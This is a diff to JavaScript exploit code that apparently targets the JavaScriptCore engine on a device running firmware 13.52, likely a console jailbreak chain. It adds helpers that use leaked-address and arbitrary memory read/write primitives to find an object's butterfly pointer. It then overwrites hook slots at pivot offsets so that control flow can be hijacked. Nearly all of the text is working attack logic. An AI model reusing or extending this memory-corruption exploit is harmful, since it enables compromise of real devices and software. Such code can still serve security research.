@@ -507,6 +507,43 @@ export function verifySlabAddrs(p, prep) {
     return out;
 }
 
+/** Heap pointer at pivotCell+0x8 (JSC butterfly) — null on empty {} on 13.52. */
+export function isPlausibleHeapPtr(v) {
+    if (!v) return false;
+    if (v.hi === 0 && v.low === 0) return false;
+    if (v.hi === 0 && v.low < 0x10000) return false;
+    if ((v.low & 7) !== 0) return false;
+    return v.hi > 0;
+}
+
+export function readPivotButterfly(p, pivotCell) {
+    if (!p || !pivotCell) return null;
+    let q = null;
+    try { q = p.read8(pivotCell.add32(0x8)); } catch (_) { q = null; }
+    return isPlausibleHeapPtr(q) ? q : null;
+}
+
+/** Empty {} has no butterfly on 13.52 — swap to textarea or prop object for bf hooks. */
+export function ensurePivotButterfly(p, prep, carrier) {
+    if (!prep || !prep.pivotCell)
+        throw new Error("ensurePivotButterfly: no prep");
+    let bf = readPivotButterfly(p, prep.pivotCell);
+    if (bf) return bf;
+    const obj = (carrier && carrier.textarea)
+        ? carrier.textarea
+        : { __p0: 1, __p1: 2, __p2: 3, __p3: 4, __p4: 5 };
+    prep.pivotObj = obj;
+    prep.pivotCell = p.leakval(obj);
+    if (prep.keepAlive && prep.keepAlive.indexOf(obj) < 0)
+        prep.keepAlive.push(obj);
+    prep._pivotBfUpgraded = (carrier && carrier.textarea) ? "ta" : "props";
+    bf = readPivotButterfly(p, prep.pivotCell);
+    if (!bf)
+        throw new Error("ensurePivotButterfly: no butterfly after pivot=" + prep._pivotBfUpgraded
+            + " cell=" + prep.pivotCell);
+    return bf;
+}
+
 /** Read-only — dump pivot object cell for hook offset hunt. */
 export function probePivotCell(p, pivotCell) {
     const rows = [];
@@ -549,14 +586,11 @@ export function bisectHookPivotMulti(p, prep, hookOffs) {
 }
 
 /** Hook store S on butterfly slots (13.52 may use rsi=butterfly not pivotCell). */
-export function bisectHookPivotButterfly(p, prep, hookOffs) {
+export function bisectHookPivotButterfly(p, prep, hookOffs, carrier) {
     if (!prep || !prep.pivotCell || !prep.M)
         throw new Error("bisectHookPivotButterfly: no prep");
     hookOffs = hookOffs || G0_HOOK_OFFS;
-    let bf = null;
-    try { bf = p.read8(prep.pivotCell.add32(0x8)); } catch (_) { bf = null; }
-    if (!bf || bf.hi === 0)
-        throw new Error("bisectHookPivotButterfly: no butterfly @ pivotCell+0x8");
+    const bf = ensurePivotButterfly(p, prep, carrier);
     if (!prep._bisect) prep._bisect = {};
     const saved = [];
     for (let i = 0; i < hookOffs.length; i++) {
@@ -624,7 +658,7 @@ function writePivotHook(p, prep, off) {
 }
 
 /** cell+0 and butterfly+0 — 13.52 may use rsi=butterfly-0x30 instead of pivotCell-0x30. */
-function writePivotHookDual(p, prep, off) {
+function writePivotHookDual(p, prep, off, carrier) {
     if (!prep || !prep.pivotCell || !prep.M)
         throw new Error("writePivotHookDual: no prep");
     if (!prep._bisect) prep._bisect = {};
@@ -635,9 +669,8 @@ function writePivotHookDual(p, prep, off) {
     const site0 = prep.pivotCell.add32(hookOff);
     saved.push({ site: site0, off: hookOff, base: "cell", val: p.read8(site0) });
     p.write8(site0, prep.M.S);
-    let bf = null;
-    try { bf = p.read8(prep.pivotCell.add32(0x8)); } catch (_) { bf = null; }
-    if (bf && bf.hi > 0) {
+    const bf = ensurePivotButterfly(p, prep, carrier);
+    if (bf) {
         saved.push({ site: bf, off: 0, base: "bf", val: p.read8(bf) });
         p.write8(bf, prep.M.S);
     }
@@ -650,14 +683,15 @@ function writePivotHookDual(p, prep, off) {
 function applyPivotHook(p, prep, off, opts) {
     opts = opts || {};
     const mode = opts.hook || "cell";
+    const carrier = opts.carrier || null;
     if (mode === "dual") {
-        writePivotHookDual(p, prep, off || {});
+        writePivotHookDual(p, prep, off || {}, carrier);
         return;
     }
     if (mode === "bf")
-        bisectHookPivotButterfly(p, prep, G0_HOOK_POOPS);
+        bisectHookPivotButterfly(p, prep, G0_HOOK_POOPS, carrier);
     else if (mode === "bf30")
-        bisectHookPivotButterfly(p, prep, [0x30]);
+        bisectHookPivotButterfly(p, prep, [0x30], carrier);
     else {
         const hookOff = mode === "cell30" ? 0x30
             : (opts.hookOff != null ? opts.hookOff : 0);
